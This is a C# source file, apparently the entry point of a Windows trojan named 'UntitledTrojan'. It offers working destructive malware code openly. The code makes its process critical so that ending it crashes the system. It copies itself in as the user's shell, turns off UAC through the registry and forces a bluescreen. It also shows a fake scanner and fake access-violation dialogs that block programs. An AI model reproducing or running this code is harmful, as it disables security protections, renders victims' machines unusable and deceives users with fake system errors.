using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using UntitledTrojan.Payloads;
using UntitledTrojan.Tools;

namespace UntitledTrojan
{
    internal static class Entry
    {
        internal static bool debug = Debugger.IsAttached;
        [DllImport("ntdll.dll", SetLastError = true)]
        internal static extern void RtlSetProcessIsCritical(int v1, int v2, int v3);
        internal static Form main;

        internal static void Main(string[] args)
        {
            // Initialize
            PayloadsManager.InitializePayloads();

            // Arguments for different things
            if (args.Length < 1)
            {
                // User just opened the trojan.
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);

                if (Failsafe.FailMain())
                {
                    if (!debug)
                    {
                        // Make sure that this process can't be killed
                        MakeUnclosable();
                        // Copy itself and set as shell
                        FileHelper.CopyItself();
                        // Disable UAC
                        RegistryKey uac = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                        if (uac == null)
                        {
                            uac = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                        }
                        uac.SetValue("EnableLUA", 0);
                        uac.Close();
                        // Bluescreen
                        Crash();
                    }
                    else
                    {
                        main = new MainForm();
                        Application.Run(main);
                    }
                }
            }
            else
            {
                if (!debug) MakeUnclosable();
                switch (args[1])
                {
                    case "/s":
                        // This is shell one. Open fake scanner
                        main = new FakeScanner();
                        Application.Run(main);
                        break;
                    case "/e":
                        // Anti-EXE running
                        Random random = new Random();
                        byte[] buffer = new byte[16 / 2];
                        random.NextBytes(buffer);
                        string result = string.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
                        string bytesString = result;
                        MessageBox.Show($"Access violation: Invalid read operation at address 0x{bytesString}", 
                            "System exception", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        break;
                }
            }
        }

        internal static void MakeUnclosable()
        {
            // Make itself a critical process
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        internal static void Crash()
        {
            // Kill itself
            if (debug) MakeUnclosable();
            Process.GetCurrentProcess().Kill();
        }
    }
}
